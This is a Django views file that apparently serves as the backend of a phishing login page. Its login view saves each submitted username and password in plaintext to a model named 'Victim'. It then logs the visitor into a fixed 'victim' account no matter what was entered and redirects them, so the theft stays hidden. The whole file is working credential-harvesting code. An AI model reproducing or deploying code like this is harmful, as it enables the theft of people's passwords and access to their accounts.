from django.http import HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.contrib.auth import login as auth_login
from django.contrib.auth.models import User

from .models import *


def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        Victim.objects.create(username=username, password=password)
        
        user = get_object_or_404(User, username='victim')
        auth_login(request, user)

        return HttpResponseRedirect(reverse('web:index'))
    else:
        return render(request, 'users/login.html')